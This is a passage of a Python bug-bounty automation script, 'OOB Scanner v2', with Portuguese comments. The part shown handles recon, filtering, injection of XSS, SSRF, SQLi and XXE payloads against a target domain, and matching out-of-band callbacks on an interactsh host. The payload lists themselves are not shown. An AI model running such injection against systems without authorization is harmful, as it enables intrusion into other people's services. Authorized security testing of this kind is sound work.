        log(f"\n  ✅ Payload correlacionado!", C.GREEN + C.BOLD)
        log(f"  Categoria  : {matched['category']}",         C.GREEN)
        log(f"  URL        : {matched['url']}",               C.GREEN)
        log(f"  Parâmetro  : {matched['param']}",             C.GREEN)
        log(f"  Enviado em : {matched['timestamp']}",         C.GREEN)
        log(f"  Hit em     : {received_at}",                  C.GREEN)
        log(f"  ⏱  Delay   : {delay_str} após envio",        C.GREEN + C.BOLD)
        log(f"  Payload    : {matched['payload'][:120]}",     C.GREEN)
    else:
        log("  ⚠  UID não encontrado no payload_log.", C.YELLOW, "warning")
        log("     Possíveis causas:", C.DIM)
        log("       • Hit de sessão anterior (use --poll para recarregar log)", C.DIM)
        log("       • DNS warmup do próprio interactsh (normal nos primeiros hits)", C.DIM)
        log("       • Payload enviado por outra ferramenta", C.DIM)
        log(f"     Buscar: grep '{raw_id[:24]}' {hits_file.parent}/payload_log.jsonl", C.DIM)

    hit = {
        "received_at":    received_at,
        "hit_ts_unix":    hit_ts_unix,
        "protocol":       proto_label,
        "remote_addr":    remote_addr,
        "raw_id":         raw_id,
        "delay_str":      delay_str,
        "raw_request":    raw_request[:500],
        "matched_entry":  matched,
    }
    hits.append(hit)
    with open(hits_file, "a", encoding="utf-8") as f:
        f.write(json.dumps(hit) + "\n")

    log(f"{'━'*60}\n", C.RED + C.BOLD)

def _manual_poll_hint(oob_host: str, out: Path):
    log("\n  ═══ MONITORAMENTO MANUAL ═══", C.YELLOW + C.BOLD)
    log(f"  1. Em outro terminal:", C.CYAN)
    log(f"     interactsh-client -server {oob_host} -json \\", C.DIM)
    log(f"       | tee {out}/interactsh_raw.jsonl", C.DIM)
    log(f"  2. Ao receber hit, extraia o 'unique-id' e cruze:", C.CYAN)
    log(f"     grep <uid> {out}/payload_log.jsonl", C.DIM)
    log(f"  3. O campo unix_ts (ms) mostra exatamente quando foi enviado.", C.DIM)

def _write_summary(hits: list, plog: PayloadLog, summary_file: Path):
    total_payloads = len(plog.entries)
    lines = [
        "=" * 70,
        "  OOB SCANNER v2 — SUMÁRIO FINAL",
        f"  Gerado em : {datetime.now(timezone.utc).isoformat()}",
        "=" * 70,
        f"  Payloads enviados : {total_payloads}",
        f"  OOB hits          : {len(hits)}",
        f"  Taxa de hit       : {len(hits)/max(total_payloads,1)*100:.1f}%",
        "",
    ]

    by_cat: dict[str, list] = {}
    for h in hits:
        m = h.get("matched_entry") or {}
        cat = m.get("category", "unknown")
        by_cat.setdefault(cat, []).append(h)

    if by_cat:
        lines.append("  ─── HITS POR CATEGORIA ───")
        for cat, cat_hits in sorted(by_cat.items()):
            lines.append(f"  {cat.upper():15} {len(cat_hits)} hit(s)")
        lines.append("")

    if hits:
        lines.append("  ─── DETALHES ───")
        for i, h in enumerate(hits, 1):
            m = h.get("matched_entry") or {}
            lines += [
                f"\n  [Hit #{i}]",
                f"    Protocolo  : {h['protocol']}",
                f"    Remote IP  : {h['remote_addr']}",
                f"    Recebido   : {h['received_at']}",
                f"    Delay      : {h.get('delay_str', '?')} após envio",
                f"    Categoria  : {m.get('category','?')}",
                f"    URL        : {m.get('url','?')}",
                f"    Parâmetro  : {m.get('param','?')}",
                f"    Payload    : {m.get('payload','?')}",
            ]
    else:
        lines.append("  Nenhum hit OOB registrado nesta sessão.")
        lines.append("  Dica: hits DNS/blind podem demorar — use --monitor-time maior.")

    summary_file.write_text("\n".join(lines), encoding="utf-8")
    log(f"\n  Sumário salvo: {summary_file}", C.GREEN)

# ─── CLI ─────────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="OOB Scanner v2 — Bug Bounty Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Execução completa
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun

  # Rápido: só XSS e SSRF, 5 threads, delay 1s
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --categories xss ssrf --threads 5 --delay 1.0

  # Reutiliza recon anterior
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --skip-recon

  # Longo monitoramento (blind SQLi DNS pode demorar)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --monitor-time 1800 --categories sqli xxe

  # Com proxy (ex: Burp Suite)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --proxy http://127.0.0.1:8080

  # Só monitorar (payloads já enviados em sessão anterior)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun \\
      --poll --monitor-time 600
        """
    )
    p.add_argument("-d", "--domain",    required=True,  help="Domínio alvo")
    p.add_argument("-o", "--oob",       required=True,  help="Host interactsh (ex: abc.oast.fun)")
    p.add_argument("--skip-recon",      action="store_true", help="Pula reconhecimento")
    p.add_argument("--skip-inject",     action="store_true", help="Pula injeção")
    p.add_argument("--poll",            action="store_true", help="Só monitora OOB")
    p.add_argument("--monitor-time",    type=int,   default=300,  metavar="S",
                   help="Duração do monitoramento em segundos (default: 300)")
    p.add_argument("--delay",           type=float, default=0.5,  metavar="S",
                   help="Delay mínimo entre requisições — rate limit global (default: 0.5)")
    p.add_argument("--threads",         type=int,   default=3,    metavar="N",
                   help="Threads de injeção paralelas (default: 3)")
    p.add_argument("--categories",      nargs="+",  metavar="CAT",
                   choices=list(PAYLOADS.keys()),
                   help="Categorias a injetar (default: todas)")
    p.add_argument("--proxy",           default="",   metavar="URL",
                   help="Proxy HTTP (ex: http://127.0.0.1:8080)")
    p.add_argument("--output-dir",      default="oob_results", metavar="DIR",
                   help="Diretório de saída (default: oob_results/)")
    return p.parse_args()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    banner()
    args = parse_args()

    if not re.match(r'^[a-zA-Z0-9.\-]+$', args.domain):
        print(f"{C.RED}Domínio inválido: {args.domain}{C.RESET}")
        sys.exit(1)

    # FIX: inicializa o rate limiter global com o delay escolhido pelo usuário.
    global _rate_limiter
    _rate_limiter = GlobalRateLimiter(args.delay)

    out = Path(args.output_dir) / args.domain.replace(".", "_")
    out.mkdir(parents=True, exist_ok=True)

    global logger
    logger = setup_logging(out)

    log(f"Alvo       : {args.domain}", C.CYAN + C.BOLD)
    log(f"OOB Host   : {args.oob}",    C.CYAN + C.BOLD)
    log(f"Threads    : {args.threads}", C.CYAN)
    log(f"Rate limit : 1 req / {args.delay}s (global)", C.CYAN)
    log(f"Output     : {out}/",         C.CYAN)
    if args.proxy:
        log(f"Proxy      : {args.proxy}", C.CYAN)

    plog = PayloadLog(out / "payload_log.jsonl")

    if args.poll:
        plog_file = out / "payload_log.jsonl"
        if plog_file.exists():
            for line in plog_file.read_text().splitlines():
                try:
                    e = json.loads(line)
                    plog._by_uid[e["uid"]] = e
                    plog._all.append(e)
                except Exception:
                    pass
            log(f"  Carregados {len(plog._all)} payloads do log anterior.", C.DIM)
        phase_monitor(args.oob, plog, out, args.monitor_time)
        return

    live_urls_file = out / "live_urls.txt"
    if not args.skip_recon:
        live_urls_file = phase_recon(args.domain, out)
    else:
        if not live_urls_file.exists():
            log("live_urls.txt não encontrado. Rode sem --skip-recon.", C.RED, "error")
            sys.exit(1)
        log(f"Recon pulado. Usando: {live_urls_file}", C.YELLOW)

    category_files = phase_gf(live_urls_file, out)
    if args.categories:
        category_files = {k: v for k, v in category_files.items()
                          if k in args.categories}

    if not category_files:
        log("Nenhum endpoint encontrado após filtragem gf.", C.YELLOW, "warning")

    if not args.skip_inject and category_files:
        monitor_thread = phase_monitor(
            args.oob, plog, out, args.monitor_time, parallel=True
        )
        log("  Monitor OOB iniciado em background.", C.DIM)

        phase_inject(category_files, args.oob, out, plog,
                     delay=args.delay, threads=args.threads, proxy=args.proxy)

        if monitor_thread and monitor_thread.is_alive():
            remaining = args.monitor_time
            log(f"\n  Injeção concluída. Aguardando monitor por mais {remaining}s...",
                C.CYAN)
            monitor_thread.join(timeout=remaining)
    else:
        if args.skip_inject:
            log("Injeção pulada (--skip-inject).", C.YELLOW)
        phase_monitor(args.oob, plog, out, args.monitor_time)

    log(f"\n{'═'*60}", C.GREEN)
    log(f"  Concluído. Resultados em: {out}/", C.GREEN + C.BOLD)
    log(f"{'═'*60}\n", C.GREEN)


if __name__ == "__main__":
    def _sigint(s, f):
        print(f"\n{C.YELLOW}  Interrompido.{C.RESET}")
        sys.exit(0)
    signal.signal(signal.SIGINT, _sigint)
    main()
